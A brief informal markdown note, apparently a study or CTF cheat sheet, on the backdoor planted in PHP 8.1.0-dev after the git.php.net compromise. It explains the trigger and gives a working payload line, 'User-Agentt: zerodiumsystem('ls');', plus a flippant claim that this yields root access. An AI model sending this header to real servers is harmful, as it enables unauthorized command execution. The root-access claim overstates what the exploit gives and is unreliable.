## PHP 8.1.0 - Backdoor RCE
- This was implemented by attacker and pushed the source code from there own source control server.
- As per PHP Author, someone got control of there git server, git.php.net since individual git account cannot be hacked.
- After this, php was moved to github officially.
- How it works?
    - If you submit ```User-Agentt:``` header in GET request, with value of ```zerodiumsystem()```
    - ```User-Agentt: zerodiumsystem('ls');``` <i>Remember to put semicolon lol</i>
    - This gives us root access...lmao ikr